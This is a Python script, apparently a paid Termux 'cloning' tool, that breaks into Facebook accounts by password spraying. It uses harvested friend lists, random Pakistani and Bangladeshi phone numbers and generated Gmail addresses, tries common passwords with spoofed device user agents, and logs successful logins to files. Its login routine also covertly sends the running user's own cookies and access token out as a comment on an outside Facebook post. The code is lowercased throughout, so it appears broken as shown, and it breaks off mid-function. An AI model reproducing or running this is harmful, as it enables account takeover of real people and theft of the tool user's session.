#source by : awais tahir

from os import path
import os,base64,zlib,pip,urllib
#os.system('xdg-open https://facebook.com/groups/351076900316263/')
print('\n\033[1;37m install modules...\n it will take some seconds...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import threadpoolexecutor as tred
except modulenotfounderror:
        print('\n installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python aking.py')
except:pass
        
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['gt-1015','gt-1020','gt-1030','gt-1035','gt-1040','gt-1045','gt-1050','gt-1240','gt-1440','gt-1450','gt-18190','gt-18262','gt-19060i','gt-19082','gt-19083','gt-19105','gt-19152','gt-19192','gt-19300','gt-19505','gt-2000','gt-20000','gt-200s','gt-3000','gt-414xop','gt-6918','gt-7010','gt-7020','gt-7030','gt-7040','gt-7050','gt-7100','gt-7105','gt-7110','gt-7205','gt-7210','gt-7240r','gt-7245','gt-7303','gt-7310','gt-7320','gt-7325','gt-7326','gt-7340','gt-7405','gt-7550   5gt-8005','gt-8010','gt-81','gt-810','gt-8105','gt-8110','gt-8220s','gt-8410','gt-9300','gt-9320','gt-93g','gt-a7100','gt-a9500','gt-android','gt-b2710','gt-b5330','gt-b5330b','gt-b5330l','gt-b5330zkainu','gt-b5510','gt-b5512','gt-b5722','gt-b7510','gt-b7722','gt-b7810','gt-b9150','gt-b9388','gt-c3010','gt-c3262','gt-c3310r','gt-c3312','gt-c3312r','gt-c3313t','gt-c3322','gt-c3322i','gt-c3520','gt-c3520i','gt-c3592','gt-c3595','gt-c3782','gt-c6712','gt-e1282t','gt-e1500','gt-e2200','gt-e2202','gt-e2250','gt-e2252','gt-e2600','gt-e2652w','gt-e3210','gt-e3309','gt-e3309i','gt-e3309t','gt-g530h','gt-g900f','gt-g930f','gt-h9500','gt-i5508','gt-i5801','gt-i6410','gt-i8150','gt-i8160okltpa','gt-i8160zwlttt','gt-i8258','gt-i8262d','gt-i8268','gt-i8505','gt-i8530baabtu','gt-i8530balcho','gt-i8530balttt','gt-i8550e','gt-i8700','gt-i8750','gt-i900','gt-i9008l','gt-i9040','gt-i9080e','gt-i9082c','gt-i9082ewainu','gt-i9082i','gt-i9100g','gt-i9100lklcht','gt-i9100m','gt-i9100p','gt-i9100t','gt-i9105uandbt','gt-i9128e','gt-i9128i','gt-i9128v','gt-i9158p','gt-i9158v','gt-i9168i','gt-i9192i','gt-i9195h','gt-i9195l','gt-i9250','gt-i9303i','gt-i9305n','gt-i9308i','gt-i9505g','gt-i9505x','gt-i9507v','gt-i9600','gt-m190','gt-m5650','gt-mini','gt-n5000s','gt-n5100','gt-n5105','gt-n5110','gt-n5120','gt-n7000b','gt-n7005','gt-n7100t','gt-n7102','gt-n7105','gt-n7105t','gt-n7108','gt-n7108d','gt-n8000','gt-n8005','gt-n8010','gt-n8020','gt-n9000','gt-n9505','gt-p1000cwaxsa','gt-p1000m','gt-p1000t','gt-p1010','gt-p3100b','gt-p3105','gt-p3108','gt-p3110','gt-p5100','gt-p5200','gt-p5210xd1','gt-p5220','gt-p6200','gt-p6200l','gt-p6201','gt-p6210','gt-p6211','gt-p6800','gt-p7100','gt-p7300','gt-p7300b','gt-p7310','gt-p7320','gt-p7500d','gt-p7500m','gt-p7500r','gt-p7500v','gt-p7501','gt-p7511','gt-s3330','gt-s3332','gt-s3333','gt-s3370','gt-s3518','gt-s3570','gt-s3600i','gt-s3650','gt-s3653w','gt-s3770k','gt-s3770m','gt-s3800w','gt-s3802','gt-s3850','gt-s5220','gt-s5220r','gt-s5222','gt-s5230','gt-s5230w','gt-s5233t','gt-s5233w','gt-s5250','gt-s5253','gt-s5260','gt-s5280','gt-s5282','gt-s5283b','gt-s5292','gt-s5300','gt-s5300l','gt-s5301','gt-s5301b','gt-s5301l','gt-s5302','gt-s5302b','gt-s5303','gt-s5303b','gt-s5310','gt-s5310b','gt-s5310c','gt-s5310e','gt-s5310g','gt-s5310i','gt-s5310l','gt-s5310m','gt-s5310n','gt-s5312','gt-s5312b','gt-s5312c','gt-s5312l','gt-s5330','gt-s5360','gt-s5360b','gt-s5360l','gt-s5360t','gt-s5363','gt-s5367','gt-s5369','gt-s5380','gt-s5380d','gt-s5500','gt-s5560','gt-s5560i','gt-s5570b','gt-s5570i','gt-s5570l','gt-s5578','gt-s5600','gt-s5603','gt-s5610','gt-s5610k','gt-s5611','gt-s5620','gt-s5670','gt-s5670b','gt-s5670hkbzta','gt-s5690','gt-s5690r','gt-s5830','gt-s5830d','gt-s5830g','gt-s5830i','gt-s5830l','gt-s5830m','gt-s5830t','gt-s5830v','gt-s5831i','gt-s5838','gt-s5839i','gt-s6010','gt-s6010bbabtu','gt-s6012','gt-s6012b','gt-s6102','gt-s6102b','gt-s6293t','gt-s6310b','gt-s6310zwamid','gt-s6312','gt-s6313t','gt-s6352','gt-s6500','gt-s6500d','gt-s6500l','gt-s6790','gt-s6790l','gt-s6790n','gt-s6792l','gt-s6800','gt-s6800hkaxfa','gt-s6802','gt-s6810','gt-s6810b','gt-s6810e','gt-s6810l','gt-s6810m','gt-s6810mbaser','gt-s6810p','gt-s6812','gt-s6812b','gt-s6812c','gt-s6812i','gt-s6818','gt-s6818v','gt-s7230e','gt-s7233e','gt-s7250d','gt-s7262','gt-s7270','gt-s7270l','gt-s7272','gt-s7272c','gt-s7273t','gt-s7278','gt-s7278u','gt-s7390','gt-s7390g','gt-s7390l','gt-s7392','gt-s7392l','gt-s7500','gt-s7500ababtu','gt-s7500abadbt','gt-s7500abttlp','gt-s7500cwadbt','gt-s7500l','gt-s7500t','gt-s7560','gt-s7560m','gt-s7562','gt-s7562c','gt-s7562i','gt-s7562l','gt-s7566','gt-s7568','gt-s7568i','gt-s7572','gt-s7580e','gt-s7583t','gt-s758x','gt-s7592','gt-s7710','gt-s7710l','gt-s7898','gt-s7898i','gt-s8500','gt-s8530','gt-s8600','gt-stb919','gt-t140','gt-t150','gt-v8a','gt-v8i','gt-vc818','gt-vm919s','gt-w131','gt-w153','gt-x831','gt-x853','gt-x870','gt-x890','gt-y8750'])
ugen=[]
for xd in range(10000):
        aa='mozilla/5.0 (linux; u; android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' tl-tl; {str(gt)}'
        g='applewebkit/537.36 (khtml, like gecko) chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='mobile safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='mozilla/5.0 (linux; android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; t-mobile mytouch 3g slide build/'
        d=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
        e=random.randrange(1, 999)
        f=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
        g='applewebkit/537.36 (khtml, like gecko) chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='mobile safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
logo=("""\033[1;37m
db   db d888888b d8b   db  .d8b.  
88   88   `88'   888o  88 d8' `8b 
88ooo88    88    88v8o 88 88ooo88 
88~~~88    88    88 v8o88 88~~~88 
88   88   .88.   88  v888 88   88 
yp   yp y888888p vp   v8p yp   yp 
----------------------------------------------
 author    : hina rehman
 github    :   hino
 facebook  : hina rehman
 tool name : h o x
 type type : paid
 version   : 1.9.8
----------------------------------------------
 axb pro version 1.9.8
 for get on allaha almighty 
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "mozilla/5.0 (linux; android 6.0.1; redmi 4a build/mmb29m) applewebkit/537.36 (khtml, like gecko) chrome/59.0.3071.92 mobile safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-id,id;q=0.9,en-us;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(eaag\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' welcome\033[1;32m : '+name)
                print(' \033[1;37myour uid : '+idd)
                print(' barth day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02sj97pfy1my3cvbljgajrz22fr7yc75jfklobfihonlsq9agxmgkotatcylkmddpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' cookies login has been successfull...')
                time.sleep(1)
                menu()
        except keyerror:
                print('\033[1;31m cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.connectionerror:
                exit(' internet connection error...')
        except attributeerror:
                print('\033[1;31m cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except keyerror:
                print('\033[1;31myour cookies han expired...');time.sleep(1)
                login()
        except ioerror:
                print('\033[1;31myour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m welcome '+name)
                linex()
        except keyerror:
                print('\033[1;31myour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mhow many ids you went to clone ?\033[1;37m '))
        except valueerror:
                exit(' put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print(' all method working try 1 by 1 ')
        linex()
        print(' [1] method 1 (for new ids) \n [2] method 2 (for old ids)\n [3] method 3 (for old ids)')
        linex()
        mthd = input(' choose method: ')
        linex()
        print(' do you went show cp account? (y/n): ')
        linex()
        cx=input(' choose: ')
        if cx in ['y','y','yes','yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (keyerror,ioerror):
                        pass
                except requests.exceptions.connectionerror:
                        exit(f' no internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' how many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mmethod -> \033[1;37mm{mthd}')
                        print("\033[1;37m \x1b[38;5;208muse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' the process has completed')
                print(' total ok/cp: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' press enter to back ')
                os.system('python aking.py')
        except requests.exceptions.connectionerror:
                exit(f' no internet connection')
        except (keyerror,ioerror):
                print(f' no friends for {userr}')
                time.sleep(3)
                public()
def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] file cloning\n [2] create ids file\n [3] public cloning\n [4] random number cloning\n [5] random gmail crack\n [6] whatsapp group (join)\n [7] download vpn\n [8] how to use video\n [0] exit menu')
                        linex()
                        xd=input(' choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' put file example:  /sdcard/file.txt  etc..')
                                linex()
                                file = input(' put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except filenotfounderror:
                                        print(' file location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' all method working try 1 by 1 ')
                                linex()
                                print(' [1] method 1 (for new ids) \n [2] method 2 (for old ids)\n [3] method 3 (for old ids)')
                                linex()
                                mthd=input(' choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' how many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' put password {i+1}: '))
                                linex()
                                print(' do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' choose: ')
                                if cx in ['y','y','yes','yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mmethod -> \033[1;37mm{mthd}')
                                        print("\033[1;37m \x1b[38;5;208muse flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' the process has completed')
                                print(' total ok/cp: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' press enter to back ')
                                os.system('python aking.py')
                        elif xd in ['2','02']:
                                import dump
                                dump.main()
                        elif xd in ['3','03']:
                                public()
                        elif xd in ['4','04']:
                                clear()
                                print(' [1] pakistan cloning\n [2] bangladesh cloning\n [3] gmail cloning\n [0] back menu')
                                linex()
                                x=input(' choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        gmail()
                                else:
                                        menu()
                        elif xd in ['5','05']:
                                gmail()
                        elif xd in ['6','06']:
                                wx=('dsj9jmwoixk4qsje0ng3na')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/aking_vpn1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://facebook.com/groups/416223860582672/');menu()
                        elif xd in ['0','00']:
                                exit(' thanks for use 🥰 ')
                        else:
                                exit(' option not found in menu...')
                else:
                        print("\033[1;31m your not premium user...!\033[1;37m");time.sleep(1)
                        clear()
                        print('\033[1;31m first read note : ')
                        print("\033[1;36m we not responsible if facebook\n go on update you not get ok idz\n we don't responsible if you delete your \n termux and key need approve\033[1;37m")
                        linex()
                        print(' \033[1;31myour key not registered\033[1;37m')
                        print(f" \033[1;37myour key : {fkeyx}")
                        linex();print (" tools.. : facebook cloning");print (" massage : your key not registered");print (" status  : \033[1;91mtrail\033[1;37m\n \033[1;31m\033[1;42mnote: if you are free user don't come ib\033[0;0m");linex();print(' [+] file crack\n [+] create ids file\n [+] public crack\n [+] random number crack\n [+] random gmail crack\n [+] exit menu\n\x1b[1;97m [1] upgrade tool to (\x1b[1;95mpremium\x1b[1;37m)')
                        linex()
                        input(" choose option : ")
                        linex()
                        print(" your subscription date expire")
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923165456679&text="
                        name = input(" enter your name : ")
                        linex()
                        tks = ("hi azan sir, i need to buy your paid axb pro tools version 1.9.8 premium please accept my key to premium :)\n\n name :- "+name+"\n key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' run :  python axb.py')
                        exit()
        except valueerror:
                exit()
        except requests.exceptions.connectionerror:
                print('\n no internet connection ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;31m code example: 0306,0315,0335,0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except valueerror:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as aking:     
                        clear()
                        tl = str(len(user))
                        print(' total account : \033[1;32m'+tl)
                        print(f'\033[1;37m choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208muse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' the process has completed')
                print(' total ok/cp: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' press enter to back ')
                os.system('python axb.py')
def bd():
                user=[]
                clear()
                print('\033[1;31m code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except valueerror:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as aking:     
                        clear()
                        tl = str(len(user))
                        print(' total account : \033[1;32m'+tl)
                        print(f'\033[1;37m choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208muse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' the process has completed')
                print(' total ok/cp: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' press enter to back ')
                os.system('python axb.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' put last name: ')
                linex()
                print(' example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' put limit: '))
                except valueerror:
                        limit = 5000
                linex()
                print(' getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as aking:
                        total = str(len(fo))
                        clear()
                        print(' total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208muse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except indexerror:
                                        last_name = 'khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' the process has completed')
                print(' total ok/cp: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' press enter to back ')
                os.system('python aking.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [hina-successfull] %s|\033[1;32mok:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('first',first).replace('last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" not a;brand";v="99", "chromium";v="100", "google chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-us,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=false,headers=head)
                        aking=session.cookies.get_dict().keys()
                        if "c_user" in aking:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [hina-ok] %s | %s'%(ids,pas))
                                open('/sdcard/aking-ok.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [hina-cp] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/aking-cp.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.connectionerror:
                time.sleep(20)
        loop+=1
xxxxx=("gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [hina] %s|\033[1;32mok:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('first',fn).replace('last',ln.lower()).replace('last',ln).replace('name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'davik/2.1.0 (linux; u; android {str(android_version)}.0.0; {str(gtt)} build/{str(gttt)} [fban/fb4a;fbav/{str(application_version)};fbbv/{str(application_version_code)};fbdm/'+'{density=2.0,width=720,height=1280};'+f'fblc/en_us;fbrv/{str(application_version_code)};fbcr/movistar;fbmf/samsung;fbbd/samsung;fbpn/{str(fbs)};fbdv/{str(gtt)};fbsv/7.0;fbop/1;fbca/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_us","client_country_code":"us",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'authorization':'oauth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'excellent',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=false).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [hina-ok] '+ids+' | '+pas+'\033[1;97m')
